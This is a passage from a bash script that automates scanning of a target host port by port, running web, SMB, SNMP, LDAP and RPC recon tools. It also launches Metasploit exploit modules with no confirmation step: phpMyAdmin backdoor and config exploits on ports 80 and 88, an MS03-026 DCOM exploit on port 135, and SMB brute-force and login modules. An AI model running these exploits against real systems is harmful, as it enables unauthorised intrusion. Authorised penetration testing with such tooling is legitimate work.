    echo -e "$RED CHECKING HTTP HEADERS AND METHODS ${RESET}"
    echo -e "${GREEN}===========================================================================${RESET}"
    python /media/sf_KaliSharedFolder/tools/autoscan/tools/XSSTracer/xsstracer.py $TARGET 80 > $LOG_DIR/$TARGET.python /media/sf_KaliSharedFolder/tools/autoscan/tools/XSSTracer/xsstracer.py.txt  
    echo -e "${GREEN}===========================================================================${RESET}"
    echo -e "$RED CHECKING HTTP HEADERS ${RESET}"
    echo -e "${GREEN}===========================================================================${RESET}"
    curl --connect-timeout 1 -I -s -R http://$TARGET > $LOG_DIR/$TARGET.headers-http.txt  
    echo -e "${GREEN}===========================================================================${RESET}"
    echo -e "$RED CHECKING HTTP HEADERS ${RESET}"
    echo -e "${GREEN}===========================================================================${RESET}"
    curl -s --insecure -I http://$TARGET:$PORT | egrep -i 'X-Content' | tail -n 10 >> $LOG_DIR/$TARGET.headers-http.txt  
    echo -e "$BLUE+ -- --=[Checking if X-Frame options are enabled on $TARGET...${RESET} $ORANGE"
    curl -s --insecure -I http://$TARGET:$PORT | egrep -i 'X-Frame' | tail -n 10  >> $LOG_DIR/$TARGET.headers-http.txt  
    echo -e "$BLUE+ -- --=[Checking if X-XSS-Protection header is enabled on $TARGET...${RESET} $ORANGE"
    curl -s --insecure -I http://$TARGET:$PORT | egrep -i 'X-XSS' | tail -n 10 >> $LOG_DIR/$TARGET.headers-http.txt  
    echo -e "$BLUE+ -- --=[Checking HTTP methods on $TARGET...${RESET} $ORANGE"
    curl -s --insecure -I -X OPTIONS http://$TARGET:$PORT | grep Allow | tail -n 10  >> $LOG_DIR/$TARGET.headers-http.txt  
    echo -e "$BLUE+ -- --=[Checking if TRACE method is enabled on $TARGET...${RESET} $ORANGE"
    curl -s --insecure -I -X TRACE http://$TARGET:$PORT | grep TRACE | tail -n 10 >> $LOG_DIR/$TARGET.headers-http.txt  
    echo -e "$BLUE+ -- --=[Checking for META tags on $TARGET...${RESET} $ORANGE"
    curl -s --insecure http://$TARGET:$PORT | egrep -i meta --color=auto | tail -n 10 >> $LOG_DIR/$TARGET.headers-http.txt  
    echo -e "$BLUE+ -- --=[Checking for open proxy on $TARGET...${RESET} $ORANGE"
    curl -s --insecure -x http://$TARGET:$PORT -L http://google.com | tail -n 10  >> $LOG_DIR/$TARGET.headers-http.txt  
    echo -e "$BLUE+ -- --=[Enumerating software on $TARGET...${RESET} $ORANGE"
    curl -s --insecure -I http://$TARGET:$PORT | egrep -i "Server:|X-Powered|ASP|JSP|PHP|.NET" | tail -n 10 >> $LOG_DIR/$TARGET.headers-http.txt  
    echo -e "$BLUE+ -- --=[Checking if Strict-Transport-Security is enabled on $TARGET...${RESET} $ORANGE"
    curl -s --insecure -I http://$TARGET:$PORT | egrep -i "Strict-Transport-Security" | tail -n 10  >> $LOG_DIR/$TARGET.headers-http.txt  
    echo -e "$BLUE+ -- --=[Checking for Flash cross-domain policy on $TARGET...${RESET} $ORANGE"
    curl -s --insecure http://$TARGET:$PORT/crossdomain.xml | tail -n 10 >> $LOG_DIR/$TARGET.headers-http.txt  
    echo -e "$BLUE+ -- --=[Checking for Silverlight cross-domain policy on $TARGET...${RESET} $ORANGE"
    curl -s --insecure http://$TARGET:$PORT/clientaccesspolicy.xml | tail -n 10  >> $LOG_DIR/$TARGET.headers-http.txt  
    echo -e "$BLUE+ -- --=[Checking for HTML5 cross-origin resource sharing on $TARGET...${RESET} $ORANGE"
    curl -s --insecure -I http://$TARGET:$PORT | egrep -i "Access-Control-Allow-Origin" | tail -n 10  >> $LOG_DIR/$TARGET.headers-http.txt  
    echo -e "$BLUE+ -- --=[Retrieving robots.txt on $TARGET...${RESET} $ORANGE"
    curl -s --insecure http://$TARGET:$PORT/robots.txt | tail -n 10  >> $LOG_DIR/$TARGET.headers-http.txt  
    echo -e "$BLUE+ -- --=[Retrieving sitemap.xml on $TARGET...${RESET} $ORANGE"
    curl -s --insecure http://$TARGET:$PORT/sitemap.xml | tail -n 10  >> $LOG_DIR/$TARGET.headers-http.txt  
    echo -e "$BLUE+ -- --=[Checking cookie attributes on $TARGET...${RESET} $ORANGE"
    curl -s --insecure -I http://$TARGET:$PORT | egrep -i "Cookie:" | tail -n 10  >> $LOG_DIR/$TARGET.headers-http.txt # 
    echo -e "$BLUE+ -- --=[Checking for ASP.NET Detailed Errors on $TARGET...${RESET} $ORANGE"
    curl -s --insecure http://$TARGET:$PORT/%3f.jsp | egrep -i 'Error|Exception' | tail -n 10  >> $LOG_DIR/$TARGET.headers-http.txt  
    curl -s --insecure http://$TARGET:$PORT/test.aspx -L | egrep -i 'Error|Exception|System.Web.'  >> $LOG_DIR/$TARGET.headers-http.txt  
    ##echo -e "${GREEN}===========================================================================${RESET}"
    ##echo -e "$RED SAVING SCREENSHOTS - Create Directory $LOG_DIR ${RESET}"
    ##echo -e "${GREEN}===========================================================================${RESET}"
    ##cutycapt --url=http://$TARGET --out=$LOG_DIR/$TARGET-port80.jpg  
    echo -e "${GREEN}===========================================================================${RESET}"
    echo -e "$RED RUNNING WEB VULNERABILITY SCAN ${RESET}"
    echo -e "${GREEN}===========================================================================${RESET}"
    nikto -h http://$TARGET:$PORT -Format xml -o $LOG_DIR/$TARGET.nikto.80.xml 
    echo -e "${GREEN}===========================================================================${RESET}"
    echo -e "$RED RUNNING SQLMAP SCAN ${RESET}"
    echo -e "${GREEN}===========================================================================${RESET}"
    sqlmap -u "http://$TARGET:$PORT" --batch --crawl=5 --level 1 --risk 1 -f -a # 
    echo -e "${GREEN}===========================================================================${RESET}"
    echo -e "$RED RUNNING PHPMYADMIN METASPLOIT EXPLOIT ${RESET}"
    echo -e "${GREEN}===========================================================================${RESET}"
    msfconsole -x "use exploit/multi/http/phpmyadmin_3522_backdoor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT $PORT; show options; run; use exploit/unix/webapp/phpmyadmin_config; run; use multi/http/phpmyadmin_preg_replace; run; exit;"  
    echo -e "${GREEN}====================================================================================${RESET}"
    echo -e "$RED RUNNING WORDPRESS VULNERABILITY SCAN ${RESET}"
    echo -e "${GREEN}====================================================================================${RESET}"
    wpscan --url http://$TARGET --batch --disable-tls-checks > $LOG_DIR/$TARGET.wpscan.txt  
    wpscan --url http://$TARGET/wp-admin/ --batch --disable-tls-checks >> $LOG_DIR/$TARGET.wpscan.txt   
    wpscan --url http://$TARGET/wordpress/ --batch --disable-tls-checks >> $LOG_DIR/$TARGET.wpscan.txt  
    wpscan --url http://$TARGET/blog/wp-login.php --batch --disable-tls-checks >> $LOG_DIR/$TARGET.wpscan.txt  
    echo -e "${GREEN}====================================================================================${RESET}"
    echo -e "$RED RUNNING CMSMAP ${RESET}"
    echo -e "${GREEN}====================================================================================${RESET}"
    python $CMSMAP -t https://$TARGET > $LOG_DIR/$TARGET.cmsmap.txt  
    python $CMSMAP -t https://$TARGET/wordpress/ >> $LOG_DIR/$TARGET.cmsmap.txt  
    echo -e "${GREEN}====================================================================================${RESET}"
    echo -e "$RED RUNNING JEXBOSS ${RESET}"
    echo -e "${GREEN}====================================================================================${RESET}"
    python $TOOL_DIR/jexboss/jexboss.py -u http://$TARGET:80 -out $LOG_DIR/$TARGET.jexboss80.log  
    echo -e "${GREEN}====================================================================================${RESET}"
    echo -e "$RED ENUMERATING WEB SOFTWARE ${RESET}"
    echo -e "${GREEN}====================================================================================${RESET}"
    clusterd -i $TARGET > $LOG_DIR/$TARGET.clusterd.txt  
    echo -e "${GREEN}====================================================================================${RESET}"
    echo -e "$RED RUNNING WEB VULNERABILITY SCAN ${RESET}"
    echo -e "${GREEN}====================================================================================${RESET}"
    #arachni --report-save-path=$LOG_DIR/ --output-only-positives --checks=active/* http://$TARGET:80 
    #arachni_reporter $LOG_DIR/*.afr --report=xml:outfile=$LOG_DIR/$TARGET-http_80.xml
fi

if [ -z "$port_88" ];
  then
    echo -e "$RED + -- --=[Port 88 closed... skipping.${RESET}"
  else
   echo -e "${GREEN}====================================================================================${RESET}"
   echo -e "$RED GATHERING DNS SUBDOMAINS ${RESET}"
   echo -e "${GREEN}====================================================================================${RESET}"
   python $TOOL_DIR/Sublist3r/sublist3r.py -d $TARGET -p 88 -vvv -o $LOG_DIR/$TARGET.sublister88.txt 
   dos2unix $LOG_DIR/domains/domains-$TARGET.txt 2>/dev/null > $LOG_DIR/$TARGET.dos2unix88.txt 
    echo -e "${GREEN}===========================================================================${RESET}"
    echo -e "$ORANGE + -- --=[Port 88 opened... running tests...${RESET}"
    echo -e "${GREEN}===========================================================================${RESET}"
    echo -e "$RED CHECKING FOR WAF ${RESET}"
    echo -e "${GREEN}===========================================================================${RESET}"
    wafw00f http://$TARGET:88 > $LOG_DIR/$TARGET.wafw00f88.txt  
    echo -e "${GREEN}===========================================================================${RESET}"
    echo -e "$RED GATHERING HTTP INFO ${RESET}"
    echo -e "${GREEN}===========================================================================${RESET}"
   whatweb http://$TARGET:88 > $LOG_DIR/$TARGET.whatweb88.txt  
    echo -e "${GREEN}===========================================================================${RESET}"
    echo -e "$RED CHECKING HTTP HEADERS AND METHODS ${RESET}"
    echo -e "${GREEN}===========================================================================${RESET}"
    python /media/sf_KaliSharedFolder/tools/autoscan/tools/XSSTracer/xsstracer.py $TARGET 88 > $LOG_DIR/$TARGET.python /media/sf_KaliSharedFolder/tools/autoscan/tools/XSSTracer/xsstracer.py88.txt  
    echo -e "${GREEN}===========================================================================${RESET}"
    echo -e "$RED CHECKING HTTP HEADERS "http://$TARGET:88" ${RESET}"
    echo -e "${GREEN}===========================================================================${RESET}"
    curl --connect-timeout 1 -I -s -R http://$TARGET:88 > $LOG_DIR/$TARGET.headers-http.88.txt  
    curl -s --insecure -I http://$TARGET:88 | egrep -i 'X-Content' | tail -n 10 >> $LOG_DIR/$TARGET.headers-http88.txt  
    echo -e "$BLUE+ -- --=[Checking if X-Frame options are enabled on $TARGET...${RESET} $ORANGE"
    curl -s --insecure -I http://$TARGET:88 | egrep -i 'X-Frame' | tail -n 10  >> $LOG_DIR/$TARGET.headers-http88.txt  
    echo -e "$BLUE+ -- --=[Checking if X-XSS-Protection header is enabled on $TARGET...${RESET} $ORANGE"
    curl -s --insecure -I http://$TARGET:88 | egrep -i 'X-XSS' | tail -n 10 >> $LOG_DIR/$TARGET.headers-http88.txt  
    echo -e "$BLUE+ -- --=[Checking HTTP methods on $TARGET...${RESET} $ORANGE"
    curl -s --insecure -I -X OPTIONS http://$TARGET:88 | grep Allow | tail -n 10  >> $LOG_DIR/$TARGET.headers-http88.txt  
    echo -e "$BLUE+ -- --=[Checking if TRACE method is enabled on $TARGET...${RESET} $ORANGE"
    curl -s --insecure -I -X TRACE http://$TARGET:88 | grep TRACE | tail -n 10 >> $LOG_DIR/$TARGET.headers-http88.txt  
    echo -e "$BLUE+ -- --=[Checking for META tags on $TARGET...${RESET} $ORANGE"
    curl -s --insecure http://$TARGET:88 | egrep -i meta --color=auto | tail -n 10 >> $LOG_DIR/$TARGET.headers-http88.txt  
    echo -e "$BLUE+ -- --=[Checking for open proxy on $TARGET...${RESET} $ORANGE"
    curl -s --insecure -x http://$TARGET:88 -L http://google.com | tail -n 10  >> $LOG_DIR/$TARGET.headers-http88.txt  
    echo -e "$BLUE+ -- --=[Enumerating software on $TARGET...${RESET} $ORANGE"
    curl -s --insecure -I http://$TARGET:88 | egrep -i "Server:|X-Powered|ASP|JSP|PHP|.NET" | tail -n 10 >> $LOG_DIR/$TARGET.headers-http88.txt  
    echo -e "$BLUE+ -- --=[Checking if Strict-Transport-Security is enabled on $TARGET...${RESET} $ORANGE"
    curl -s --insecure -I http://$TARGET:88 | egrep -i "Strict-Transport-Security" | tail -n 10  >> $LOG_DIR/$TARGET.headers-http88.txt  
    echo -e "$BLUE+ -- --=[Checking for Flash cross-domain policy on $TARGET...${RESET} $ORANGE"
    curl -s --insecure http://$TARGET:88/crossdomain.xml | tail -n 10 >> $LOG_DIR/$TARGET.headers-http88.txt  
    echo -e "$BLUE+ -- --=[Checking for Silverlight cross-domain policy on $TARGET...${RESET} $ORANGE"
    curl -s --insecure http://$TARGET:88/clientaccesspolicy.xml | tail -n 10  >> $LOG_DIR/$TARGET.headers-http88.txt  
    echo -e "$BLUE+ -- --=[Checking for HTML5 cross-origin resource sharing on $TARGET...${RESET} $ORANGE"
    curl -s --insecure -I http://$TARGET:88 | egrep -i "Access-Control-Allow-Origin" | tail -n 10  >> $LOG_DIR/$TARGET.headers-http88.txt  
    echo -e "$BLUE+ -- --=[Retrieving robots.txt on $TARGET...${RESET} $ORANGE"
    curl -s --insecure http://$TARGET:88/robots.txt | tail -n 10  >> $LOG_DIR/$TARGET.headers-http88.txt  
    echo -e "$BLUE+ -- --=[Retrieving sitemap.xml on $TARGET...${RESET} $ORANGE"
    curl -s --insecure http://$TARGET:88/sitemap.xml | tail -n 10  >> $LOG_DIR/$TARGET.headers-http88.txt  
    echo -e "$BLUE+ -- --=[Checking cookie attributes on $TARGET...${RESET} $ORANGE"
    curl -s --insecure -I http://$TARGET:88 | egrep -i "Cookie:" | tail -n 10  >> $LOG_DIR/$TARGET.headers-http88.txt  
    echo -e "$BLUE+ -- --=[Checking for ASP.NET Detailed Errors on $TARGET...${RESET} $ORANGE"
    curl -s --insecure http://$TARGET:88/%3f.jsp | egrep -i 'Error|Exception' | tail -n 10  >> $LOG_DIR/$TARGET.headers-http88.txt  
    curl -s --insecure http://$TARGET:88/test.aspx -L | egrep -i 'Error|Exception|System.Web.'  >> $LOG_DIR/$TARGET.headers-http88.txt  
    echo -e "${GREEN}===========================================================================${RESET}"
    #echo -e "$RED SAVING SCREENSHOTS - Create Directory $LOG_DIR ${RESET}"
    #echo -e "${GREEN}===========================================================================${RESET}"
    #cutycapt --url=http://$TARGET:88 --out=$LOG_DIR/$TARGET-port88.jpg  
    echo -e "${GREEN}===========================================================================${RESET}"
    echo -e "$RED RUNNING WEB VULNERABILITY SCAN ${RESET}"
    echo -e "${GREEN}===========================================================================${RESET}"
    nikto -h http://$TARGET:88 -Format xml -o $LOG_DIR/$TARGET.nikto.88.xml  
    echo -e "${GREEN}===========================================================================${RESET}"
    echo -e "$RED RUNNING SQLMAP SCAN ${RESET}"
    echo -e "${GREEN}===========================================================================${RESET}"
    sqlmap -u "http://$TARGET:88" --batch --crawl=5 --level 1 --risk 1 -f -a  
    echo -e "${GREEN}===========================================================================${RESET}"
    echo -e "$RED RUNNING PHPMYADMIN METASPLOIT EXPLOIT ${RESET}"
    echo -e "${GREEN}===========================================================================${RESET}"
    msfconsole -x "use exploit/multi/http/phpmyadmin_3522_backdoor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT "88"; run; use exploit/unix/webapp/phpmyadmin_config; run; use multi/http/phpmyadmin_preg_replace; run; exit;"  
    echo -e "${GREEN}====================================================================================${RESET}"
    echo -e "$RED RUNNING WORDPRESS VULNERABILITY SCAN ${RESET}"
    echo -e "${GREEN}====================================================================================${RESET}"
    wpscan --url http://$TARGET:88 --batch --disable-tls-checks > $LOG_DIR/$TARGET.wpscan88.txt  
    wpscan --url http://$TARGET:88/wp-admin/ --batch --disable-tls-checks >> $LOG_DIR/$TARGET.wpscan88.txt  
    wpscan --url http://$TARGET:88/wordpress/ --batch --disable-tls-checks >> $LOG_DIR/$TARGET.wpscan88.txt  
    wpscan --url http://$TARGET:88/blog/wp-login.php --batch --disable-tls-checks >> $LOG_DIR/$TARGET.wpscan88.txt  
    echo -e "${GREEN}====================================================================================${RESET}"
    echo -e "$RED RUNNING CMSMAP ${RESET}"
    echo -e "${GREEN}====================================================================================${RESET}"
    python $CMSMAP -t https://$TARGET:88 > $LOG_DIR/$TARGET.cmsmap88.txt  
    echo ""
    python $CMSMAP -t https://$TARGET:88/wordpress/ >> $LOG_DIR/$TARGET.cmsmap88.txt  
    echo -e "${GREEN}====================================================================================${RESET}"
    echo -e "$RED RUNNING JEXBOSS ${RESET}"
    echo -e "${GREEN}====================================================================================${RESET}"
    python $TOOL_DIR/jexboss/jexboss.py -u http://$TARGET:88 -out $LOG_DIR/$TARGET.jexboss88.log  
    echo -e "${GREEN}====================================================================================${RESET}"
    echo -e "$RED ENUMERATING WEB SOFTWARE ${RESET}"
    echo -e "${GREEN}====================================================================================${RESET}"
    clusterd -i $TARGET -p 88 > $LOG_DIR/$TARGET.clusterd88.txt  
    echo -e "${GREEN}====================================================================================${RESET}"
    echo -e "$RED RUNNING WEB VULNERABILITY SCAN ${RESET}"
    echo -e "${GREEN}====================================================================================${RESET}"
    #arachni --report-save-path=$LOG_DIR/ --output-only-positives --checks=active/* http://$TARGET:88 > test.arachni.log  
    #arachni_reporter $LOG_DIR/*.afr --report=xml:outfile=$LOG_DIR/$TARGET-http_88.xml  
    #cat $LOG_DIR/$TARGET-http_88.xml |grep -v Arachni | grep -v Author | grep -v Website | grep -v Documentation
fi


if [ -z "$port_110" ];
then
  echo -e "$RED + -- --=[Port 110 closed... skipping.${RESET}"
else
  echo -e "$ORANGE + -- --=[Port 110 opened... running tests...${RESET}"
  nmap -A -sV   --script=pop* -p 110 $TARGET -oX $LOG_DIR/$TARGET.pop3.xml   
fi

if [ -z "$port_111" ];
then
  echo -e "$RED + -- --=[Port 111 closed... skipping.${RESET}"
else
  echo -e "$ORANGE + -- --=[Port 111 opened... running tests...${RESET}"
  showmount -a $TARGET > $LOG_DIR/$TARGET.showmount.txt  
  showmount -d $TARGET >> $LOG_DIR/$TARGET.showmount.txt  
  showmount -e $TARGET >> $LOG_DIR/$TARGET.showmount.txt  
  echo -e "$RED #####################################################"
  echo -e "$ORANGE + -- --=[end Port 111  tests...${RESET}"
  echo -e "$RED #####################################################"
fi

if [ -z "$port_123" ];
then
  echo -e "$RED + -- --=[Port 123 closed... skipping.${RESET}"
else
  echo -e "$ORANGE + -- --=[Port 123 opened... running tests...${RESET}"
  nmap -A -sU -sV -Pn  --script=ntp-* -p 68 $TARGET -oX $LOG_DIR/$TARGET.ntp.xml   
  echo -e "$RED #####################################################"
  echo -e "$ORANGE + -- --=[end Port 123 tests...${RESET}"
  echo -e "$RED #####################################################"
fi

if [ -z "$port_135" ];
then
  echo -e "$RED + -- --=[Port 135 closed... skipping.${RESET}"
else
  echo -e "$ORANGE + -- --=[Port 135 opened... running tests...${RESET}"
  rpcinfo -p $TARGET > $LOG_DIR/$TARGET.rpcinfo.txt  
  nmap -A -p 135  --script=rpc* $TARGET -oX $LOG_DIR/$TARGET.rpc.xml   
  msfconsole -x "workspace "$WORKSPACE"; set RHOST "$TARGET"; use windows/dcerpc/ms03_026_dcom; show options; run -z; exit -y; exit;" ##  
  echo -e "$ORANGE ##############################################################"
  echo -e "$RED    #     try to exploit one more time  ms03_026_dcom...${RESET}   #"
  echo -e "$ORANGE ##############################################################" 
 msfconsole -x "workspace "$WORKSPACE"; set RHOST "$TARGET"; use windows/dcerpc/ms03_026_dcom; show options; run -z; exit -y; exit;"  
  echo -e "$RED #####################################################"
  echo -e "$ORANGE + -- --=[end Port 135 tests...${RESET}"
  echo -e "$RED #####################################################"
fi

if [ -z "$port_139" ];
then
  echo -e "$RED + -- --=[Port 139 closed... skipping.${RESET}"
else
  echo -e "$RED #####################################################"
  echo -e "$ORANGE + -- --=[Port 139 opened... running tests...${RESET}"
  echo -e "$RED #####################################################"
  SMB="1"
  echo -e "${GREEN}====================================================================================${RESET}"
  echo -e "$RED RUNNING SMB ENUMERATION ${RESET}"
  echo -e "${GREEN}====================================================================================${RESET}"
enum4linux -U -M -S -u $addUSER -P $addpasswd $TARGET > $LOG_DIR/$TARGET.enum4linux_139.txt #  
cat $LOG_DIR/$TARGET.enum4linux_139.txt
  python $SAMRDUMP $TARGET > $LOG_DIR/$TARGET.smadump_139.txt #  
cat $LOG_DIR/$TARGET.smadump_139.txt
  nbtscan $TARGET > $LOG_DIR/$TARGET.nbtscan_139.txt #  
cat $LOG_DIR/$TARGET.nbtscan_139.txt
  nmap -vv -A -sV  -p139 --script=smb-server-stats --script=smb-ls --script=smb-enum-domains --script=smb-protocols --script=smb-psexec --script=smb-enum-groups --script=smb-enum-processes --script=smb-brute --script=smb-print-text --script=smb-security-mode --script=smb-os-discovery --script=smb-enum-sessions --script=smb-mbenum --script=smb-enum-users --script=smb-enum-shares --script=smb-system-info --script=smb-vuln-ms10-054 --script=smb-vuln-ms10-061 $TARGET -oX $LOG_DIR/$TARGET.port139.xml >> $LOG_DIRnmaptcp.log #  
  msfconsole -x "workspace "$WORKSPACE"; use auxiliary/scanner/smb/pipe_auditor; setg RPORT 139; setg RPORTS 139; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; schow options; run; use auxiliary/scanner/smb/pipe_dcerpc_auditor; schow options; run; use auxiliary/scanner/smb/psexec_loggedin_users; schow options; run; use auxiliary/scanner/smb/smb2; schow options; run;use auxiliary/scanner/smb/smb_enum_gpp; schow options; run; use auxiliary/scanner/smb/smb_enumshares; schow options; run; use auxiliary/scanner/smb/smb_enumusers; schow options; run;use auxiliary/scanner/smb/smb_enumusers_domain; schow options; run; use auxiliary/scanner/smb/smb_login; schow options; run; use auxiliary/scanner/smb/smb_lookupsid; schow options; run; use auxiliary/scanner/smb/smb_uninit_cred; schow options; run; use auxiliary/scanner/smb/smb_version; schow options; run;  exit -y;" >> $LOG_DIRmsfworkspace.log #  
# AD SERVER OPTION IN SCRIPT THEN ACTIVATE THIS EXPLOIT#
#  msfconsole -x "use exploit/linux/samba/chain_reply; et TARGET Linux (Debian5 3.2.5-4lenny6); show options; run -z; exit -y;"  
#
  echo -e "${RESET}" 
  echo -e "${RESET}"
  echo -e "$RED #####################################${RESET}"
  echo -e "$ORANGE + -- --=[end Port 139 TCP tests...${RESET}"
  echo -e "$RED #####################################${RESET}"
fi

if [ -z "$port_161" ];
then
  echo -e "$RED + -- --=[Port 161 closed... skipping.${RESET}"
else
  echo -e "$ORANGE + -- --=[Port 161 opened... running tests...${RESET}"
  nmap --script=/usr/share/nmap/scripts/snmp-brute.nse,/usr/share/nmap/scripts/snmp-hh3c-logins.nse,/usr/share/nmap/scripts/snmp-interfaces.nse,/usr/share/nmap/scripts/snmp-ios-config.nse,/usr/share/nmap/scripts/snmp-netstat.nse,/usr/share/nmap/scripts/snmp-processes.nse,/usr/share/nmap/scripts/snmp-sysdescr.nse,/usr/share/nmap/scripts/snmp-win32-services.nse,/usr/share/nmap/scripts/snmp-win32-shares.nse,/usr/share/nmap/scripts/snmp-win32-software.nse,/usr/share/nmap/scripts/snmp-win32-users.nse -sV -A -p 161 -sU -sT $TARGET -oX $LOG_DIR/$TARGET.port161.xml   
  msfconsole -x "use auxiliary/scanner/snmp/snmp_enum; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; show options; run; exit;"  
  echo -e "$RED #################################${RESET}"
  echo -e "$ORANGE + -- --=[end Port 161 tests...${RESET}"
  echo -e "$RED #################################${RESET}"
fi

if [ -z "$port_162" ];
then
  echo -e "$RED + -- --=[Port 162 closed... skipping.${RESET}"
else
  echo -e "$ORANGE + -- --=[Port 162 opened... running tests...${RESET}"
  nmap --script=/usr/share/nmap/scripts/snmp-brute.nse,/usr/share/nmap/scripts/snmp-hh3c-logins.nse,/usr/share/nmap/scripts/snmp-interfaces.nse,/usr/share/nmap/scripts/snmp-ios-config.nse,/usr/share/nmap/scripts/snmp-netstat.nse,/usr/share/nmap/scripts/snmp-processes.nse,/usr/share/nmap/scripts/snmp-sysdescr.nse,/usr/share/nmap/scripts/snmp-win32-services.nse,/usr/share/nmap/scripts/snmp-win32-shares.nse,/usr/share/nmap/scripts/snmp-win32-software.nse,/usr/share/nmap/scripts/snmp-win32-users.nse -sV -A -p 162 -sU -sT $TARGET -oX $LOG_DIR/$TARGET.port162.xml   
  msfconsole -x "use auxiliary/scanner/snmp/snmp_enum; setg RHOSTS "$TARGET"; show options; run; exit;"  
  echo -e "$RED #################################${RESET}"
  echo -e "$ORANGE + -- --=[end Port 162 tests...${RESET}"
  echo -e "$RED #################################${RESET}"
fi


if [ -z "$port_389" ];
then
  echo -e "$RED + -- --=[Port 389 closed... skipping.${RESET}"
else
  echo -e "$ORANGE + -- --=[Port 389 opened... running tests...${RESET}"
  nmap -A -p 389 -Pn  --script=ldap* $TARGET -oX $LOG_DIR/$TARGET.port389.xml    
  echo -e "$RED #####################################${RESET}"
  echo -e "$ORANGE + -- --=[end Port 389 TCP tests...${RESET}"
  echo -e "$RED #####################################${RESET}"
fi

if [ -z "$port_443" ];
then
  echo -e "$RED + -- --=[Port 443 closed... skipping.${RESET}"
else
  echo -e "$ORANGE + -- --=[Port 443 opened... running tests...${RESET}"
  echo -e "${GREEN}====================================================================================${RESET}"
  echo -e "$RED CHECKING FOR WAF ${RESET}"
  echo -e "${GREEN}====================================================================================${RESET}"
  wafw00f https://$TARGET > $LOG_DIR/$TARGET.wafw00f443.txt  
  echo ""
  echo -e "${GREEN}====================================================================================${RESET}"
  echo -e "$RED GATHERING HTTP INFO ${RESET}"
  echo -e "${GREEN}====================================================================================${RESET}"
  whatweb https://$TARGET > $LOG_DIR/$TARGET.whatweb.txt  
  echo -e "${GREEN}====================================================================================${RESET}"
  echo -e "$RED CHECKING HTTP HEADERS AND METHODS ${RESET}"
  echo -e "${GREEN}====================================================================================${RESET}"
  python /media/sf_KaliSharedFolder/tools/autoscan/tools/XSSTracer/xsstracer.py $TARGET 443 > $LOG_DIR/$TARGET.python /media/sf_KaliSharedFolder/tools/autoscan/tools/XSSTracer/xsstracer.py.txt  
  echo -e "${GREEN}====================================================================================${RESET}"
  echo -e "$RED CHECKING HTTP HEADERS ${RESET}"
  echo -e "${GREEN}====================================================================================${RESET}"
  curl --connect-timeout 1 -I -s -R https://$TARGET >>$LOG_DIR/$TARGET.headers-https.txt  
  echo -e "$BLUE+ -- --=[Checking if X-Content options are enabled on $TARGET...${RESET} $ORANGE"
  curl -s --insecure -I https://$TARGET | egrep -i 'X-Content' | tail -n 10 >> $LOG_DIR/$TARGET.headers-https.txt  
  echo ""
  echo -e "$BLUE+ -- --=[Checking if X-Frame options are enabled on $TARGET...${RESET} $ORANGE"
  curl -s --insecure -I https://$TARGET | egrep -i 'X-Frame' | tail -n 10 >> $LOG_DIR/$TARGET.headers-https.txt  
  echo ""
  echo -e "$BLUE+ -- --=[Checking if X-XSS-Protection header is enabled on $TARGET...${RESET} $ORANGE"
  curl -s --insecure -I https://$TARGET | egrep -i 'X-XSS' | tail -n 10 >> $LOG_DIR/$TARGET.headers-https.txt  
  echo ""
  echo -e "$BLUE+ -- --=[Checking HTTP methods on $TARGET...${RESET} $ORANGE" 
  curl -s --insecure -I -X OPTIONS https://$TARGET | grep Allow >> $LOG_DIR/$TARGET.headers-https.txt  
  echo ""
  echo -e "$BLUE+ -- --=[Checking if TRACE method is enabled on $TARGET...${RESET} $ORANGE"
  curl -s --insecure -I -X TRACE https://$TARGET | grep TRACE >> $LOG_DIR/$TARGET.headers-https.txt  
  echo ""
  echo -e "$BLUE+ -- --=[Checking for META tags on $TARGET...${RESET} $ORANGE"
 curl -s --insecure https://$TARGET | egrep -i meta --color=auto | tail -n 10 >> $LOG_DIR/$TARGET.headers-https.txt  
  echo ""
  echo -e "$BLUE+ -- --=[Checking for open proxy on $TARGET...${RESET} $ORANGE"
  curl -x https://$TARGET:443 -L https://google.com -s --insecure | tail -n 10 >> $LOG_DIR/$TARGET.headers-https.txt  
  echo ""
  echo -e "$BLUE+ -- --=[Enumerating software on $TARGET...${RESET} $ORANGE"
  curl -s --insecure -I https://$TARGET | egrep -i "Server:|X-Powered|ASP|JSP|PHP|.NET" | tail -n 10  >> $LOG_DIR/$TARGET.headers-https.txt  
  echo ""
  echo -e "$BLUE+ -- --=[Checking if Strict-Transport-Security is enabled on $TARGET...${RESET} $ORANGE"
  curl -s --insecure -I https://$TARGET/ | egrep -i "Strict-Transport-Security" | tail -n 10  >> $LOG_DIR/$TARGET.headers-https.txt  
  echo ""
  echo -e "$BLUE+ -- --=[Checking for Flash cross-domain policy on $TARGET...${RESET} $ORANGE"
  curl -s --insecure https://$TARGET/crossdomain.xml | tail -n 10  >> $LOG_DIR/$TARGET.headers-https.txt  
  echo ""
  echo -e "$BLUE+ -- --=[Checking for Silverlight cross-domain policy on $TARGET...${RESET} $ORANGE"
  curl -s --insecure https://$TARGET/clientaccesspolicy.xml | tail -n 10  >> $LOG_DIR/$TARGET.headers-https.txt  
  echo ""
  echo -e "$BLUE+ -- --=[Checking for HTML5 cross-origin resource sharing on $TARGET...${RESET} $ORANGE"
  curl -s --insecure -I https://$TARGET | egrep -i "Access-Control-Allow-Origin" | tail -n 10  >> $LOG_DIR/$TARGET.headers-https.txt  
  echo ""
  echo -e "$BLUE+ -- --=[Retrieving robots.txt on $TARGET...${RESET} $ORANGE"
  curl -s --insecure https://$TARGET/robots.txt | tail -n 10  >> $LOG_DIR/$TARGET.headers-https.txt  
  echo ""
  echo -e "$BLUE+ -- --=[Retrieving sitemap.xml on $TARGET...${RESET} $ORANGE"
  curl -s --insecure https://$TARGET/sitemap.xml | tail -n 10  >> $LOG_DIR/$TARGET.headers-https.txt  
  echo ""
  echo -e "$BLUE+ -- --=[Checking cookie attributes on $TARGET...${RESET} $ORANGE"
  curl -s --insecure -I https://$TARGET | egrep -i "Cookie:" | tail -n 10  >> $LOG_DIR/$TARGET.headers-https.txt  
  echo ""
  echo -e "$BLUE+ -- --=[Checking for ASP.NET Detailed Errors on $TARGET...${RESET} $ORANGE"
  curl -s --insecure https://$TARGET/%3f.jsp | egrep -i 'Error|Exception' | tail -n 10  >> $LOG_DIR/$TARGET.headers-https.txt  
  curl -s --insecure https://$TARGET/test.aspx -L | egrep -i 'Error|Exception|System.Web.' | tail -n 10  >> $LOG_DIR/$TARGET.headers-https.txt  
